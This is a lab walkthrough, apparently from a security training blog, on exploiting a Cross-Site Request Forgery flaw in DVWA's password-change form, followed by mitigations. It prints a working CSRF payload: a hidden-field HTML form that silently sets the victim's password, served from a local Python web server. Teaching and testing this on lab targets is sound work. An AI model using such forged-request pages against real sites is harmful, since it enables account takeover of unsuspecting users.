---
title: Cross-Site Request Forgery (CSRF)
date: 2024-01-06 08:01:35 +0300
subtitle: Product Design
image: '/images/806.png'
---
# Cross-Site Request Forgery (CSRF)

## **Objective**
Understand and exploit a Cross-Site Request Forgery (CSRF) vulnerability, demonstrating how attackers use it to execute unauthorized actions on behalf of authenticated users, and learn mitigation strategies.

---

## **Purpose**
CSRF attacks trick authenticated users into performing unintended actions on a web application. This lab shows how such attacks work, their risks, and how to secure applications against them.

---

## **Tools Required**
- **Kali Linux** (or any system with a web browser and Burp Suite installed).
- A vulnerable web application (e.g., Damn Vulnerable Web Application - DVWA).
- **Burp Suite Community Edition**: For intercepting and crafting requests.

---

## **Lab Topology**
- **Kali Linux**: Hosting the tools and accessing the vulnerable application.
- **DVWA**: Running locally or in a virtualized environment to simulate a vulnerable website.

---

## **Walkthrough**

### **Task 1: Setting Up DVWA**
1. **Install DVWA**:
   - Follow [DVWA installation instructions](https://github.com/digininja/DVWA).
   - Host it on a local server (e.g., XAMPP, WAMP, or a Docker container).

2. **Access DVWA**:
   - Open a browser and navigate to:
     ```
     http://<dvwa_ip>/dvwa
     ```
   - Replace `<dvwa_ip>` with the IP of the system hosting DVWA.

3. **Login to DVWA**:
   - Default credentials:
     ```
     Username: admin
     Password: password
     ```

4. **Set Security Level**:
   - Navigate to **DVWA Security**.
   - Set the security level to **Low**.

---

### **Task 2: Understanding CSRF**
1. **What is CSRF?**
   - A CSRF attack tricks a user into submitting unauthorized requests, exploiting the user's authenticated session with the target application.
   
2. **Key Indicators**:
   - No CSRF tokens in requests.
   - Sensitive actions performed via GET or POST requests without user verification.

---

### **Task 3: Identifying the Vulnerable Functionality**
1. **Navigate to the CSRF Section**:
   - In DVWA, click on the **CSRF** module in the navigation menu.

2. **Observe the Change Password Form**:
   - The form allows changing the user's password without any CSRF protection (e.g., no tokens).

3. **Inspect the Request**:
   - Open your browser’s developer tools (F12) or use Burp Suite to inspect the form submission.
   - Note the HTTP request and parameters:
     ```http
     POST /dvwa/vulnerabilities/csrf/ HTTP/1.1
     Host: <dvwa_ip>
     Content-Type: application/x-www-form-urlencoded

     password_new=123456&password_conf=123456&Change=Change
     ```

---

### **Task 4: Crafting the CSRF Exploit**
1. **Create a Malicious HTML Page**:
   - Open a text editor and create the following HTML file:
     ```html
     <html>
     <body>
         <h1>CSRF Attack Demo</h1>
         <form action="http://<dvwa_ip>/dvwa/vulnerabilities/csrf/" method="POST">
             <input type="hidden" name="password_new" value="hackedpassword">
             <input type="hidden" name="password_conf" value="hackedpassword">
             <input type="hidden" name="Change" value="Change">
             <input type="submit" value="Click Here">
         </form>
     </body>
     </html>
     ```
   - Replace `<dvwa_ip>` with the IP of your DVWA instance.

2. **Host the Malicious Page**:
   - Save the file as `csrf_exploit.html` and host it on a local server using Python:
     ```bash
     python3 -m http.server 8080
     ```
   - Access the page at:
     ```
     http://<kali_ip>:8080/csrf_exploit.html
     ```
     Replace `<kali_ip>` with your Kali Linux IP.

3. **Test the Exploit**:
   - Log in to DVWA in one browser tab.
   - Open the malicious page in another tab and click the button.
   - Check if the password has changed in DVWA.

---

### **Task 5: Mitigation Strategies**
1. **Implement CSRF Tokens**:
   - Ensure all forms include a unique, user-specific CSRF token that is validated on the server.

2. **Verify HTTP Referer Headers**:
   - Check the `Referer` header to ensure requests originate from trusted sources.

3. **Use SameSite Cookies**:
   - Configure cookies with the `SameSite` attribute to restrict cross-origin requests.

4. **Educate Users**:
   - Train users to avoid clicking unknown links while authenticated on sensitive sites.

---

## **Best Practices**
1. **Regular Vulnerability Assessments**:
   - Test applications for CSRF vulnerabilities during development and post-deployment.

2. **Use Security Frameworks**:
   - Leverage frameworks that include built-in CSRF protection (e.g., Django, Spring Security).

3. **Avoid GET for Sensitive Actions**:
   - Restrict sensitive operations to POST requests and validate input.

4. **Log and Monitor Requests**:
   - Monitor unusual patterns or repeated failed CSRF attempts.

---

## **Key Takeaways**
1. CSRF exploits trust between the user and the web application.
2. Proper input validation and CSRF token implementation are critical for defense.
3. Testing for CSRF vulnerabilities ensures applications remain secure against this attack vector.

---

## **Troubleshooting Tips**
1. **Exploit Not Working**:
   - Ensure the target site is accessible from the malicious page.
   - Verify the form action URL and parameter names.

2. **DVWA Issues**:
   - Restart the server hosting DVWA if it becomes unresponsive.
   - Confirm the security level is set to **Low** for this lab.

3. **Python Server Not Accessible**:
   - Check your firewall settings to allow connections on port `8080`.
   - Verify the IP address of the Kali Linux machine.

By completing this lab, you now understand how CSRF attacks work, how to execute them in a controlled environment, and how to implement effective defenses.